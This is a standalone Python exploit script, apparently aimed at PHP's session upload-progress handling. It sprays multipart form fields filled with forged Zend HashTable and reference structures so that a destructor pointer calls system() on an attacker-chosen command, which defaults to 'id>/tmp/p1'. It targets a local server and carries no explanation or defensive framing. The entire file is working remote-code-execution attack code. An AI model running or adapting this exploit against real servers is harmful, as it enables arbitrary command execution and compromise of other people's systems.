#!/usr/bin/env python3
import socket, struct, sys
N1=int(sys.argv[1]); N2=int(sys.argv[2]); HT=int(sys.argv[3],0); SYS=int(sys.argv[4],0)
CMD=sys.argv[5].encode() if len(sys.argv)>5 else b'id>/tmp/p1'
MARK=int(sys.argv[6],0) if len(sys.argv)>6 else 0x1122334455667788
BND=b'B'*10; HOST='127.0.0.1'; PORT=8088; SID=b'attacksessionid0001'
# fake HashTable in 191-byte raw value buffer (alloc 192)
ht=bytearray(b'\x00'*191)
struct.pack_into('<II',ht,0,1,7)                # gc rc=1 type=IS_ARRAY
struct.pack_into('<II',ht,8,16,0xfffffff8)      # flags=STATIC_KEYS, nTableMask
struct.pack_into('<Q',ht,16,HT+0xa0)            # arData -> command
struct.pack_into('<II',ht,24,1,1)               # nNumUsed=nNumOfElements=1
struct.pack_into('<II',ht,32,8,0)               # nTableSize, nInternalPointer
struct.pack_into('<q',ht,40,0)                  # nNextFreeElement
struct.pack_into('<Q',ht,48,SYS)                # pDestructor = system
struct.pack_into('<Q',ht,0x38,MARK)             # marker
ht[0xa0:0xa0+len(CMD)]=CMD
ht[0xa8:0xa8+1]=b'x'  # not used if CMD covers; keep NUL after
# fake zend_reference in 55-byte raw value buffer (alloc 56), offset16
ref=bytearray(b'X'*55)
struct.pack_into('<II',ref,16,1,10)             # gc rc=1 type=IS_REFERENCE
struct.pack_into('<Q',ref,24,HT)                # val.value -> fake HT
struct.pack_into('<Q',ref,32,0x307)             # val.type = IS_ARRAY_EX
struct.pack_into('<Q',ref,40,0)                 # zend_reference.sources = NULL
parts=[{'name':'PHPSESSID','data':SID},{'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'}]
for i in range(N1):
    parts.append({'name':('a%030d'%i)[:31],'data':bytes(ht)})
for i in range(N2):
    parts.append({'name':('f%02d'%i),'data':bytes(ref)})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'+p['data']+b'\r\n'
o+=b'--'+BND+b'--\r\n'; body=bytes(o)
h=(f'POST /index.php HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection((HOST,PORT),timeout=20); s.settimeout(20)
try: s.sendall(h+body)
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
